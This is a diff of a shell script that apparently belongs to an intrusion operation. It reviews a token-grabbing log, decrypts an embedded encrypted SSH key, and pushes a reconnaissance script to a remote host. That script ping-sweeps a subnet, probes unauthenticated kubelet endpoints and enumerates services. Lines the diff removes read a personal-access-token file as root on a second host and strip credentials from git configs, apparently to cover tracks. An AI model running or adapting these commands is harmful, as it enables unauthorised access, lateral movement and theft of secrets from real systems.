@@ -1,19 +1,19 @@
-echo "=== tokgrab ==="
-head -c 800 /root/snoop/hits.log; echo
-head -40 /root/snoop/tokgrab.sh 2>/dev/null | head -20
-echo "=== k221 delivery ==="
-P=$(sha256sum /root/.rxk | awk '{print $1}')
+echo "=== tokgrab log ==="
+tail -30 /root/snoop/tokgrab.log 2>/dev/null
+ls -la /root/snoop/tg_*.json 2>/dev/null | head -20
+echo "=== k221 delivery v2 ==="
+P=$(tr -d '[:space:]' < /root/.rxk | sha256sum | awk '{print $1}')
 cat > /tmp/.k221.b64 <<'K64'
-U2FsdGVkX19LkXINo9e31msQCD0/5eugkAzFTlZs+UDO8h5ws9YdNoRBSsqL/X7ReI0SxfYMzVsZ
-afPwpwIwepW92lc3GS/4myg0s4o0G7cqZusVH5qWJlBDuXSbNtoZrulUkwEJHxJyvKNUqPDhaXO8
-xsEuf21DgZFLqZX//j4EgvXI8CqGSp97UZ/1VW1pWpmmShsPbMZF3R2b0en6uVEZ9e3zug5Jep3t
-1kXBoTwahJXpBLNaIK16ZEOpl/pquY5jH3Z05VjHLJN/N/WBlBcYorkRZuVh+2YrOy6WuqnsBl8/
-CcKDhyVIfJabXh/wSKvJHZ+WbF4kK6IjmYBAYkVXZYEdMKf+qW8Et3KxiCCDrq5XmiVZqcApl5hh
-Z5fwTQrfJvUfCWFwM3R62aiPRno5rZNATcJSnUREMwryeQLvWXOftVGaPGzyM9bBRRwyLTjRIfsw
-INA5eNIJXbYUQdqXnNJ/nUktZvpJ+XeWxD4kA3glEBxckYV9xQeCyjC/+CgzN6+27dCpGU8dXobB
-mha7baa7XJvSM/f2GtxQ8KVVqrzOusBLw5tj8tPxXihJN3hv1Ifdns29Smk6g7ZuIQ==
+U2FsdGVkX19hDB94RDecB0Uov4X30GnJiKWpJEsHPnAGNGlQHEqzOV5smXLnfr7MTr1lS5HL9sH9
+czm7yh1PeuLxrIHckUUbWCWKC216W5WEuJlScoCFVg+gpyqYbleymf6gzKV3EpZ9Q7sMRjcAmeNU
+e6KClB+1e9WmH2HKgPk+hc2aXtpNOl48WMdANew1Js9q5aVJtg3MRWHYVvEM9AhQtF4VEa/lsu8e
+CnNZ9CS1tXfsiZauxdbhYv3TCq9Ai/POOmM6ensTBaJ7tWLOCqmlEztnTqoJlQbIuiQKbHN+ToAr
+2si8dPvdOLghBMvBQP1ZlCFkz3+XMCjk7s8pqMblxv3N0CQyy2NZkWmQQLcSERs5HMqYw+y5n7pp
+hSvrSTaNAHII/oJe8aS8nAoPL3KyHOhxwNc+Jixe79gbqPiP9mr3CJeGWQoIzJrSarsTLpqh1kQN
+eInsTx9Z8ThnM8/1iYrUf+DgJHSWjRlaocHXyEox2sf2S+UfPMmzrEYZeR8o282kK9zO4DQzufAN
+xLZ0Nh3fh9helULoITz5JrcTwW7Sr+UWiAMxYxr7HimKjXpgWW3WYUCwm5cFCqaQcg==
 K64
-openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:$P -in /tmp/.k221.b64 -out /tmp/.k221 2>/dev/null && chmod 600 /tmp/.k221 && head -1 /tmp/.k221 || echo "DECRYPT-FAIL"
+openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:$P -in /tmp/.k221.b64 -out /tmp/.k221 2>/dev/null && chmod 600 /tmp/.k221 && head -1 /tmp/.k221 || echo "DECRYPT-FAIL2"
 echo "=== 221 recon ==="
 cat > /tmp/recon221.sh <<'RSH'
 #!/bin/bash
@@ -21,7 +21,7 @@ echo "=== id ==="; id; sudo -n true 2>&1 && echo SUDO-OK
 echo "=== ip addr ==="; ip -brief addr
 echo "=== ip neigh ==="; ip neigh
 echo "=== ping-sweep ==="; for i in $(seq 1 254); do (ping -c1 -W1 85.234.79.$i >/dev/null 2>&1 && echo "85.234.79.$i up") & done; wait
-echo "=== neigh after ==="; ip neigh | grep -v FAILED
+echo "=== neigh after ==="; ip neigh | grep -v FAILED | head -40
 echo "=== kubelet probes ==="
 for ip in 31 87 103 109 184 233; do
   for path in /healthz /pods; do
@@ -29,8 +29,8 @@ for ip in 31 87 103 109 184 233; do
     echo "  85.234.79.$ip:10250$path -> $code ($(wc -c < /tmp/kube-$ip$(echo $path|tr / _) 2>/dev/null) bytes)"
   done
 done
-echo "=== pods bodies (first 300 chars each) ==="
-for ip in 31 87 103 109 184 233; do echo "-- $ip --"; head -c 300 /tmp/kube-$ip_pods 2>/dev/null; echo; done
+echo "=== pods bodies (first 400 chars each) ==="
+for ip in 31 87 103 109 184 233; do echo "-- $ip --"; head -c 400 /tmp/kube-$ip_pods 2>/dev/null; echo; done
 echo "=== tailnet ==="; (command -v tailscale && tailscale status 2>&1 | head -8); ip link show tailscale0 2>&1 | head -2
 echo "=== listening ==="; ss -tlnp 2>/dev/null | head -25
 echo "=== docker ==="; docker ps 2>/dev/null | head -12
@@ -38,20 +38,8 @@ echo "=== homes ==="; ls /home/
 RSH
 chmod +x /tmp/recon221.sh
 if [ -s /tmp/.k221 ]; then
-  timeout 100 ssh -i /tmp/.k221 -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 dev-24-sudo@85.234.79.221 'bash -s' < /tmp/recon221.sh 2>&1 | head -120
+  timeout 100 ssh -i /tmp/.k221 -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 dev-24-sudo@85.234.79.221 'bash -s' < /tmp/recon221.sh 2>&1 | head -150
 else
   echo "no key, skip"
 fi
-echo "=== pats root ==="
-timeout 60 ssh -o StrictHostKeyChecking=no -i /root/.rxk radix-irprobe@85.234.79.62 'sudo bash -s' <<'PAYLOAD'
-cat /root/pats.txt
-echo "=== githist scrub ==="
-for c in /opt/githist/rx/*/.git/config; do
-  [ -f "$c" ] || continue
-  before=$(grep -cE "url = .*//[^/]*@" "$c" 2>/dev/null)
-  sed -i -E 's#(url = https?://)[^/@]+@#\1#' "$c" 2>/dev/null
-  after=$(grep -cE "url = .*//[^/]*@" "$c" 2>/dev/null)
-  echo "$c cred-urls:$before->$after"
-done
-PAYLOAD
-echo "=== B13DONE ==="
+echo "=== B14DONE ==="
